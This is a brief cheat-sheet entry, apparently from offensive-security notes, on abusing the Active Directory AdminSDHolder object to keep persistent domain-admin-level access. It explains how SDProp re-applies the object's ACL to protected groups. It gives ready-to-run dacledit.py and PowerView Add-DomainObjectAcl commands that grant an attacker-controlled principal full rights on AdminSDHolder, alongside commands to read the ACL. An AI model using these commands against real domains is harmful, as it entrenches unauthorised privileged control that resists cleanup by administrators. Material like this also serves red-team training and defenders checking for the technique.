# AdminSDHolder

### The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.

### If you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.

### Once sufficient privileges are obtained, attackers can abuse AdminSdHolder to get persistence on the domain by modifying the AdminSdHolder object's DACL. 

## Linux

 - dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'

### Inspection

 - dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'

## Windows

 - Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All

### Inspection

 - Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs
